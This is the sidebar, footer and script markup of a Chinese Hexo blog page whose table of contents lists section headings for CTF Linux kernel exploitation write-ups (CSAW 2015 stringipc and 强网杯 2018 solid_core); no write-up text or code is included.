  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">55</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAW-2015-stringipc"><span class="nav-number">1.</span> <span class="nav-text">CSAW 2015 stringipc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法一-覆写cred结构体"><span class="nav-number">1.3.</span> <span class="nav-text">利用方法一 覆写cred结构体</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进程描述符、线程描述符和cred"><span class="nav-number">1.3.1.</span> <span class="nav-text">进程描述符、线程描述符和cred</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破cred地址"><span class="nav-number">1.3.2.</span> <span class="nav-text">爆破cred地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">1.3.3.</span> <span class="nav-text">利用思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法二-劫持VDSO"><span class="nav-number">1.4.</span> <span class="nav-text">利用方法二 劫持VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#VDSO"><span class="nav-number">1.4.1.</span> <span class="nav-text">VDSO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破vdso地址"><span class="nav-number">1.4.2.</span> <span class="nav-text">爆破vdso地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode组成"><span class="nav-number">1.4.3.</span> <span class="nav-text">shellcode组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路-1"><span class="nav-number">1.4.4.</span> <span class="nav-text">利用思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2018-solid-core"><span class="nav-number">2.</span> <span class="nav-text">强网杯 2018 solid_core</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl"><span class="nav-number">2.1.</span> <span class="nav-text">prctl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-usermodehelper"><span class="nav-number">2.2.</span> <span class="nav-text">call_usermodehelper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#函数偏移"><span class="nav-number">2.3.</span> <span class="nav-text">函数偏移</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vdso"><span class="nav-number">3.1.</span> <span class="nav-text">vdso</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-number">3.2.</span> <span class="nav-text">ret2dir</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl-1"><span class="nav-number">3.3.</span> <span class="nav-text">prctl</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
